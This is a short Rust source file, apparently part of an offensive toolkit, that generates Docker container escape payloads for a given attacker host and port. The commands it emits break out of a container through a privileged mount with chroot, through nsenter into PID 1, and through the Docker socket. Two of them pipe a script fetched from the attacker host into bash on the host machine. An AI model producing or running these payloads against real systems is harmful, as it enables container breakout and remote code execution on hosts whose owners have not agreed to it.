// Docker escape payload generator
use crate::cli::banner;

pub struct DockerGenerator;

impl DockerGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str) -> String {
        banner::print_exploiting("DOCKER-ESCAPE", &format!("{}:{}", lhost, lport));
        
        format!(
            r#"# Privileged container escape
# Mount host filesystem
docker run --privileged -v /:/mnt alpine chroot /mnt bash -c 'curl -s http://{}:{}/payload.sh | bash'

# Or use nsenter if PID is accessible
nsenter -t 1 -m -u -i -n -p sh -c 'curl -s http://{}:{}/payload.sh | bash'

# Or use Docker socket
curl -X POST -H "Content-Type: application/json" \
  -d {{}} \
  http://docker.socket/containers/privileged-container/start"#,
            lhost, lport, lhost, lport
        )
    }
}
